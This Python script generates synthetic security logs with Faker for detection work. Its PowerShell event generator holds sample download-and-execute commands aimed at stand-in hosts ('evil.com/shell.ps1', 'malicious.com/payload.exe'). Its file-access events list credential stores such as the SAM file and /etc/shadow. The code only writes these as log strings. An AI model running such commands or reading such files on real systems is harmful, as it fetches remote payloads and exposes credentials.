""" This is a file used to generate synthetic data for cyber security
    We have data from known authetnicated IPs and endpoitns
    We will also have data from made up unauthenticated IPs
    We will also monitor downloads from authenticated users to unusual endpoints
    
    
    """
    
import json
import random 
import os
from datetime import datetime, timedelta
from faker import Faker    # generates fake user data
import uuid

class DataGenerator:
    
    fake = Faker() # instace of faker to create fake data
    OUTPUT_FOLDER = r"../data/Logs" 
    OUTPUT_FILE = os.path.join(OUTPUT_FOLDER, r"security_log.jsonl")
    INTERNAL_IPS = [f"192.168.1.{i}" for i in range(1, 50)]
    NUM_logs = 10000
    
    # Known "bad" external IPs we'll plant in attack scenarios
    MALICIOUS_IPS = [
        "185.220.101.45",  
        "45.33.32.156",
        "198.20.69.74",
        "89.248.167.131",
    ]
    
    USERNAMES = []
    for i in range(20):
        USERNAMES.append(fake.name().replace(" ", "_"))
    HOSTS = ["WS-001", "WS-002", "SERVER-01", "DC-01", "FILESERVER", "ADMIN-01"]

    @staticmethod # static since doesnt access the instace of its class its in
    def random_timestamp(days_back = 30):
        """Generate a random timestamp for an event
        NOTE: 86400 seconds in a day, 
        we convert to ISO format then split at the last . and take 
        everything before it to remove the microseconds""" 
        start = datetime.now() - timedelta(days=days_back)
        random_seconds = random.randint(0, days_back * 86400) 
        return (start + timedelta(seconds=random_seconds)).isoformat().split(".")[0]
        
        
        
    # --- Generate events --- # 
    def failed_login_attempt(self):
        return{
            "timestamp": self.random_timestamp(),
            "event_type": "failed_login_attempt",
            "source_ip": random.choice(self.MALICIOUS_IPS + self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "severity": "medium",
            "message": "Authentication failure for user",
        }
        
    def successful_login_attempt(self):
        return{
            "timestamp": self.random_timestamp(),
            "event_type": "successful_login_attempt",
            "source_ip": random.choice(self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "severity": "low",
            "message": "User login successfull",
        }
        
    def powershell_execution(self):
        commands = [
            "Invoke-WebRequest -Uri httpFAKE://malicious.com/payload.exe",
            "Get-Process",
            "Set-ExecutionPolicy Bypass",
            "IEX (New-Object Net.WebClient).DownloadString('httpFAKE://evil.com/shell.ps1')",
            "Get-ADUser -Filter *",
        ]
        
        return {
            "timestamp": self.random_timestamp(),
            "event_type": "powershell_execution",
            "source_ip": random.choice(self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "command": random.choice(commands),
            "severity": random.choice(["low", "medium", "high"]),
            "message": "PowerShell command executed",
        }   
    
    def malware_alert(self):
        malware_names = ["Emotet", "TrickBot", "Mimikatz", "Cobalt Strike", "WannaCry"]
        return {
        "timestamp": self.random_timestamp(),
        "event_type": "malware_detected",
        "source_ip": random.choice(self.INTERNAL_IPS),
        "destination": random.choice(self.HOSTS),
        "username": random.choice(self.USERNAMES),
        "malware_name": random.choice(malware_names),
        "file_path": f"C:\\Users\\{self.fake.user_name()}\\AppData\\{self.fake.file_name()}",
        "severity": "critical",
        "message": "Malware signature detected",
    }
    
    def port_scan(self):
        return {
            "timestamp": self.random_timestamp(),
            "event_type": "port_scan",
            "source_ip": random.choice(self.MALICIOUS_IPS),
            "destination": random.choice(self.HOSTS),
            "ports_scanned": random.randint(100, 65535),
            "severity": "high",
            "message": "Port scanning activity detected",
        }
        
    def privilege_escalation(self):
        return {
            "timestamp": self.random_timestamp(),
            "event_type": "privilege_escalation",
            "source_ip": random.choice(self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "escalated_to": "SYSTEM",
            "severity": "critical",
            "message": "User privileges elevated to SYSTEM",
        }
    def file_access(self):
        sensitive_paths = [
            "C:\\Windows\\System32\\SAM",
            "C:\\Users\\admin\\Documents\\passwords.txt",
            "/etc/passwd",
            "/etc/shadow",
            "\\\\FILESERVER\\HR\\salaries.xlsx",
        ]
        return {
            "timestamp": self.random_timestamp(),
            "event_type": "file_access",
            "source_ip": random.choice(self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "file_path": random.choice(sensitive_paths),
            "severity": random.choice(["low", "medium", "high"]),
            "message": "Sensitive file accessed",
        }
        
    def suspicious_download(self):
        return {
            "timestamp": self.random_timestamp(),
            "event_type": "suspicious_download",
            "source_ip": random.choice(self.INTERNAL_IPS),
            "destination": random.choice(self.HOSTS),
            "username": random.choice(self.USERNAMES),
            "url": f"http://{self.fake.domain_name()}/{self.fake.file_name(extension='exe')}",
            "file_size_mb": round(random.uniform(0.1, 50.0), 2),
            "severity": "high",
            "message": "Executable downloaded from external source",
        }

    @staticmethod
    def weighted_choice(EVENT_GENERATORS):
        methods, weights = zip(*EVENT_GENERATORS)
        return random.choices(methods, weights=weights, k=1)[0]



def main():
    DG = DataGenerator()

    EVENT_GENERATORS = [
        (DG.successful_login_attempt, 40),       # 40% of logs
        (DG.failed_login_attempt, 25),           # 25%
        (DG.file_access, 15),            # 15%
        (DG.powershell_execution, 10),   # 10%
        (DG.suspicious_download, 4),     # 4%
        (DG.port_scan, 3),               # 3%
        (DG.malware_alert, 2),           # 2%
        (DG.privilege_escalation, 1),    # 1%
    ]


  

    if not os.path.exists(DG.OUTPUT_FOLDER):
        os.makedirs(DG.OUTPUT_FOLDER)
    print(f'Generating {DG.NUM_logs} at {DG.OUTPUT_FILE}')

    with open(DG.OUTPUT_FILE, "w") as f:
        for i in range(DG.NUM_logs):
            method = DG.weighted_choice(EVENT_GENERATORS)
            log = method()
            log["log_ID"] = str(uuid.uuid4())
            f.write(json.dumps(log)+ "\n")
            
    print("Complete")
            
            
if __name__  == "__main__":
    main()
        

   

